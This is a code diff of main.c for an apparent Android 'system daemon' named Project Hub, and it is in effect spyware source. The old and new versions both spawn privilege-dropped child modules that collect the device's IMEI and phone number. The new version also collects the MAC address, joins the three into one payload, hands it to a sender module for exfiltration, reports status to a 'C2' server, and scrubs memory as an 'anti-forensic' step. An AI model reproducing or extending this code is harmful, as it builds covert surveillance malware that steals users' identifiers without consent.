@@ -1,292 +1,256 @@
-/*
- * Project Hub: Android System Daemon
- * * Usage: project_hub [-v] [-t timeout]
+/**
+ * @file main.c
+ * @brief Project Hub Daemon - Sequential Orchestrator.
+ *
+ * Implements the core lifecycle:
+ * 1. Initialize System Abstraction Layer.
+ * 2. Sequentially spawn isolated modules to extract data.
+ * 3. Aggregate data and exfiltrate.
+ * 4. Ensure process hygiene (zombie reaping, FD closing, memory scrubbing).
  */
 
-#include "common/sal/symbol_resolver.h"
-#include "common/ipc/ipc.h"
-#include "modules/modules.h"
-
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <sys/epoll.h>
-#include <sys/socket.h>
+#include <sys/types.h>
 #include <sys/wait.h>
-#include <sys/timerfd.h>
+#include <sys/socket.h>
 #include <sys/prctl.h>
-#include <getopt.h>
+#include <signal.h>
+#include <errno.h>
+#include <dirent.h>
+#include <ctype.h>
 
-#define MAX_EVENTS 10
-#define DEFAULT_TIMEOUT 900
+#include "ipc.h"
+#include "symbol_resolver.h"
+#include "modules.h"
 
-// --- App Context ---
-static struct {
-    int epoll_fd;
-    int sig_fd;
-    int timer_fd;
-    int active_mods;
-    int running;
-    int verbose;
-    int timeout;
-} app = {
-    .epoll_fd = -1,
-    .sig_fd = -1,
-    .timer_fd = -1,
-    .timeout = DEFAULT_TIMEOUT
-};
+// --- Configuration ---
+#define DROP_UID 9999              /**< Target UID for isolation */
+#define DROP_GID 9999              /**< Target GID for isolation */
+#define DROP_CONTEXT "u:r:isolated_app:s0" /**< SELinux Context */
 
-static struct {
-    int   active;
-    pid_t pid;
-    int   fd;
-    const mod_def_t* def;
-} workers[MOD_COUNT];
-
-static struct {
-    char imei[128];
-    char phone[128];
-    bool has_imei;
-    bool has_phone;
-    bool sent;
-} state;
-
-static int timer_trigger = 0;
-
-/* --- Logic --- */
-
-static void bus_send(int id, int type, const char* data) {
-    if (!workers[id].active) return;
+// --- Global State ---
+typedef struct {
+    char imei[256];
+    char phone_number[256];
+    char mac_address[256];
     
-    ipc_packet_t pkt = {0};
-    pkt.head.type = type;
-    pkt.head.sender = -1; // Hub
-    ipc_set_str(&pkt, data);
+    int has_imei;
+    int has_phone;
+    int has_mac;
+} GlobalContext;
 
-    if (ipc_send(workers[id].fd, &pkt) != 0 && errno != EAGAIN) {
-        LOG_F("Hub", "Send failed to %s: %s", workers[id].def->name, strerror(errno));
-        app.running = 0;
-    }
-}
+// --- Helper Functions ---
 
-static void try_finalize(void) {
-    if (state.has_imei && state.has_phone && !state.sent) {
-        if (app.verbose) LOG_I("Hub", "Data collected. Uploading...");
-        
-        char buf[512];
-        snprintf(buf, sizeof(buf), "IMEI:%s PHONE:%s", state.imei, state.phone);
-        bus_send(MOD_NET, MSG_REQ, buf);
-        state.sent = 1;
-    }
-}
+/**
+ * @brief Closes all file descriptors except the socket.
+ * Prevents FD leakage from parent to untrusted child.
+ * Safely handles /proc/self/fd/ enumeration.
+ */
+static void close_all_fds_except(int keep_fd) {
+    DIR* dir = opendir("/proc/self/fd");
+    if (!dir) return;
 
-static void on_msg(int id, const ipc_packet_t* pkt) {
-    const char* name = workers[id].def->name;
-
-    if (pkt->head.status != 0) {
-        LOG_E("Hub", "%s error: %s", name, pkt->data);
-        
-        // Mark missing data as N/A to allow completion
-        if (id == MOD_IMEI) {
-            strcpy(state.imei, "N/A");
-            state.has_imei = 1;
-        }
-        else if (id == MOD_PHONE) {
-            strcpy(state.phone, "N/A");
-            state.has_phone = 1;
-        }
-        else if (id == MOD_NET && state.sent) {
-            LOG_F("Hub", "Network failed final upload");
-            app.running = 0;
-        }
-        try_finalize();
-        return;
-    }
-
-    if (pkt->head.type == MSG_RESP) {
-        if (id == MOD_IMEI) {
-            strcpy(state.imei, (char*)pkt->data);
-            state.has_imei = 1;
-        }
-        else if (id == MOD_PHONE) {
-            strcpy(state.phone, (char*)pkt->data);
-            state.has_phone = 1;
-        }
-        else if (id == MOD_NET) {
-            LOG_I("Hub", "Transaction Complete: %s", pkt->data);
-            app.running = 0; 
-        }
-        
-        if (app.verbose && id != MOD_NET) {
-            LOG_I("Hub", "Recv from %s", name);
-        }
-        try_finalize();
-    }
-}
-
-static void on_exit(int id, int status) {
-    if (id == MOD_NET) {
-        LOG_F("Hub", "Network module died. Aborting.");
-        app.running = 0;
-        return;
-    }
+    int dir_fd = dirfd(dir);
+    struct dirent* entry;
     
-    // If a collector died before reporting, fill N/A
-    if (id == MOD_IMEI && !state.has_imei) {
-        strcpy(state.imei, "N/A"); 
-        state.has_imei = 1;
-    }
-    else if (id == MOD_PHONE && !state.has_phone) {
-        strcpy(state.phone, "N/A");
-        state.has_phone = 1;
-    }
-    try_finalize();
-}
-
-/* --- Process Management --- */
-
-static void run_worker(int fd, const mod_def_t* def) {
-    // Die if parent dies (Anti-Zombie)
-    if (sys->prctl(PR_SET_PDEATHSIG, SIGKILL) == -1) _exit(1);
-    if (getppid() == 1) _exit(1);
-
-    memset(&state, 0, sizeof(state));
-
-    // Optimisation: Don't iterate 32k FDs
-    int max = sysconf(_SC_OPEN_MAX);
-    if (max > 1024) max = 1024;
-    for (int i = 3; i < max; i++) {
-        if (i != fd) close(i);
-    }
-
-    // Drop Privs
-    if (sys->setcon(def->se_ctx) != 0) _exit(1);
-    if (sys->setresgid(def->gid, def->gid, def->gid) != 0) _exit(1);
-    if (sys->setresuid(def->uid, def->uid, def->uid) != 0) _exit(1);
-
-    def->run(fd);
-    _exit(0);
-}
-
-static void reap(void) {
-    int status;
-    pid_t pid;
-    while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
-        for (int i = 0; i < MOD_COUNT; i++) {
-            if (workers[i].active && workers[i].pid == pid) {
-                workers[i].active = 0;
-                close(workers[i].fd);
-                app.active_mods--;
-                on_exit(i, status);
-            }
+    while ((entry = readdir(dir)) != NULL) {
+        if (!isdigit(entry->d_name[0])) continue;
+        
+        int fd = atoi(entry->d_name);
+        
+        // Preserve standard streams, the keeper FD, and the directory stream
+        if (fd > 2 && fd != keep_fd && fd != dir_fd) {
+            close(fd);
         }
     }
+    closedir(dir);
 }
 
-static void spawn(int i) {
-    const mod_def_t* def = &MODULES[i];
+/**
+ * @brief Spawns a new isolated process for a module.
+ * Handles fork, socketpair, privilege dropping, and memory scrubbing.
+ */
+static pid_t spawn_module_process(
+    int module_id, 
+    const char* arg, 
+    int* parent_socket_fd,
+    void* global_ctx_ptr,
+    size_t ctx_size
+) {
     int sv[2];
-    
-    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) return;
-    
+    // Use DGRAM for atomic packet boundaries
+    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
+        sal_log_error("Socketpair failed");
+        return -1;
+    }
+
     pid_t pid = fork();
+
+    if (pid < 0) {
+        sal_log_error("Fork failed");
+        close(sv[0]); close(sv[1]);
+        return -1;
+    }
+
     if (pid == 0) {
+        // --- Child Process ---
         close(sv[0]);
-        run_worker(sv[1], def);
-    } else if (pid > 0) {
-        close(sv[1]);
-        fcntl(sv[0], F_SETFL, O_NONBLOCK);
-        
-        struct epoll_event ev = { .events = EPOLLIN, .data.ptr = &workers[i] };
-        epoll_ctl(app.epoll_fd, EPOLL_CTL_ADD, sv[0], &ev);
+        int socket_fd = sv[1];
 
-        workers[i] = (typeof(workers[0])){ 1, pid, sv[0], def };
-        app.active_mods++;
-        
-        if (app.verbose) LOG_I("Hub", "Spawned %s (pid:%d)", def->name, pid);
-    }
-}
-
-/* --- Entry --- */
-
-static void usage(const char* prog) {
-    fprintf(stderr, "Usage: %s [-v] [-t timeout_sec]\n", prog);
-    exit(1);
-}
-
-int main(int argc, char** argv) {
-
-    if (sal_init() != 0) return 1;
-
-    app.epoll_fd = epoll_create1(EPOLL_CLOEXEC);
-    
-    // Signals
-    sigset_t mask;
-    sigemptyset(&mask);
-    sigaddset(&mask, SIGCHLD);
-    sigaddset(&mask, SIGTERM);
-    sigaddset(&mask, SIGINT);
-    sigprocmask(SIG_BLOCK, &mask, NULL);
-    app.sig_fd = signalfd(-1, &mask, SFD_NONBLOCK | SFD_CLOEXEC);
-    
-    struct epoll_event ev_sig = { .events = EPOLLIN, .data.ptr = NULL };
-    epoll_ctl(app.epoll_fd, EPOLL_CTL_ADD, app.sig_fd, &ev_sig);
-
-    // Timer
-    app.timer_fd = timerfd_create(CLOCK_MONOTONIC, TFD_NONBLOCK | TFD_CLOEXEC);
-    struct itimerspec ts = { {0,0}, {app.timeout, 0} };
-    timerfd_settime(app.timer_fd, 0, &ts, NULL);
-    
-    struct epoll_event ev_tmr = { .events = EPOLLIN, .data.ptr = &timer_trigger };
-    epoll_ctl(app.epoll_fd, EPOLL_CTL_ADD, app.timer_fd, &ev_tmr);
-
-    app.running = 1;
-    for (int i = 0; i < MOD_COUNT; i++) spawn(i);
-    
-    // Kickoff
-    bus_send(MOD_IMEI, MSG_REQ, "START");
-    bus_send(MOD_PHONE, MSG_REQ, "START");
-
-    struct epoll_event events[MAX_EVENTS];
-    while (app.running && app.active_mods > 0) {
-        int n = epoll_wait(app.epoll_fd, events, MAX_EVENTS, -1);
-        
-        for (int i = 0; i < n; i++) {
-            void* p = events[i].data.ptr;
-            
-            if (!p) { // Signal
-                struct signalfd_siginfo si;
-                if (read(app.sig_fd, &si, sizeof(si)) > 0) {
-                    if (si.ssi_signo == SIGCHLD) reap();
-                    else app.running = 0;
-                }
-            }
-            else if (p == &timer_trigger) {
-                LOG_F("Hub", "Global Timeout");
-                app.running = 0;
-            }
-            else { // Worker
-                int id = (typeof(workers)*)p - workers;
-                ipc_packet_t pkt;
-                if (ipc_recv(workers[id].fd, &pkt) == 0) {
-                    on_msg(id, &pkt);
-                } else if (errno != EAGAIN) {
-                    workers[id].active = 0;
-                    close(workers[id].fd);
-                    app.active_mods--;
-                }
-            }
+        // 1. Anti-Forensic: Scrub inherited heap data
+        if (global_ctx_ptr && ctx_size > 0) {
+            memset(global_ctx_ptr, 0, ctx_size);
         }
+
+        // 2. FD Hygiene
+        close_all_fds_except(socket_fd);
+
+        // 3. Safety: Terminate if parent dies
+        prctl(PR_SET_PDEATHSIG, SIGKILL);
+
+        // 4. Drop Privileges
+        sal_set_selinux_context(DROP_CONTEXT);
+        
+        // Strict Error Checking: Die if we cannot drop privileges
+        if (setresgid(DROP_GID, DROP_GID, DROP_GID) < 0) _exit(EXIT_FAILURE);
+        if (setresuid(DROP_UID, DROP_UID, DROP_UID) < 0) _exit(EXIT_FAILURE);
+
+        // 5. Execute Module
+        module_entry_fn entry = get_module_entry(module_id);
+        if (entry) {
+            entry(socket_fd, arg);
+        }
+
+        close(socket_fd);
+        _exit(EXIT_SUCCESS); 
     }
 
-    // Teardown
-    for (int i = 0; i < MOD_COUNT; i++) {
-        if (workers[i].active) kill(workers[i].pid, SIGKILL);
-    }
-    sal_cleanup();
-    return 0;
+    // --- Parent Process ---
+    close(sv[1]);
+    *parent_socket_fd = sv[0];
+    return pid;
 }
+
+/**
+ * @brief Waits for data from a module with a timeout.
+ */
+static int collect_result(int socket_fd, char* buffer, size_t size) {
+    IpcResponse resp;
+    ipc_init_response(&resp);
+
+    struct timeval tv = {2, 0}; // 2 Second Timeout
+    setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+
+    int ret = ipc_receive_packet(socket_fd, &resp);
+    
+    if (ret == 0 && resp.status_code == 0 && resp.data_len > 0) {
+        strncpy(buffer, resp.payload, size - 1);
+        buffer[size - 1] = '\0';
+        return 1; // Success
+    }
+    return 0; // Failure/Timeout
+}
+
+/**
+ * @brief Spawns the Logger module to report status to C2.
+ */
+static void run_logger(const char* msg, void* ctx, size_t ctx_sz) {
+    int dummy_fd;
+    pid_t pid = spawn_module_process(MOD_ID_LOGGER, msg, &dummy_fd, ctx, ctx_sz);
+    if (pid > 0) {
+        close(dummy_fd);
+        waitpid(pid, NULL, 0);
+    }
+}
+
+/**
+ * @brief Executes a single extraction stage (Spawn -> Collect -> Reap -> Log).
+ */
+static int execute_stage(
+    int mod_id, 
+    const char* stage_name, 
+    char* out_buf, 
+    size_t out_len, 
+    GlobalContext* ctx
+) {
+    sal_log_info("Extracting %s...", stage_name);
+    
+    int fd;
+    pid_t pid = spawn_module_process(mod_id, NULL, &fd, ctx, sizeof(GlobalContext));
+    int success = 0;
+    char log_buf[256];
+
+    if (pid > 0) {
+        if (collect_result(fd, out_buf, out_len)) {
+            success = 1;
+            snprintf(log_buf, sizeof(log_buf), "%s: Success", stage_name);
+        } else {
+            sal_log_error("%s: Failed/Timeout", stage_name);
+            kill(pid, SIGKILL); // Force kill if hung
+            snprintf(log_buf, sizeof(log_buf), "%s: Failed", stage_name);
+        }
+        close(fd);
+        waitpid(pid, NULL, 0); // Always reap to prevent zombies
+        
+        // Report status to C2
+        run_logger(log_buf, ctx, sizeof(GlobalContext));
+    } else {
+        sal_log_error("Failed to spawn %s", stage_name);
+    }
+
+    return success;
+}
+
+// --- Main Orchestrator ---
+
+int main() {
+    sal_init();
+    sal_log_info("Project Hub v2.1 Started. PID: %d", getpid());
+
+    GlobalContext* ctx = (GlobalContext*)calloc(1, sizeof(GlobalContext));
+    if (!ctx) return EXIT_FAILURE;
+
+    // --- Phase 2: Sequential Extraction ---
+    
+    if (execute_stage(MOD_ID_IMEI, "IMEI", ctx->imei, sizeof(ctx->imei), ctx)) {
+        ctx->has_imei = 1;
+    }
+
+    if (execute_stage(MOD_ID_PHONE, "Phone", ctx->phone_number, sizeof(ctx->phone_number), ctx)) {
+        ctx->has_phone = 1;
+    }
+
+    if (execute_stage(MOD_ID_MAC, "MAC", ctx->mac_address, sizeof(ctx->mac_address), ctx)) {
+        ctx->has_mac = 1;
+    }
+
+    // --- Phase 3: Aggregation & Exfiltration ---
+    sal_log_info("Aggregating Payload...");
+    
+    char final_payload[4096];
+    snprintf(final_payload, sizeof(final_payload), 
+        "IMEI:%s|PHONE:%s|MAC:%s",
+        ctx->has_imei ? ctx->imei : "N/A",
+        ctx->has_phone ? ctx->phone_number : "N/A",
+        ctx->has_mac ? ctx->mac_address : "N/A"
+    );
+
+    int fd;
+    pid_t pid = spawn_module_process(MOD_ID_SENDER, final_payload, &fd, ctx, sizeof(GlobalContext));
+    if (pid > 0) {
+        close(fd); 
+        waitpid(pid, NULL, 0);
+    }
+
+    // --- Shutdown ---
+    free(ctx);
+    sal_cleanup();
+    sal_log_info("Daemon Exiting Gracefully.");
+    return EXIT_SUCCESS;
+}
+
+
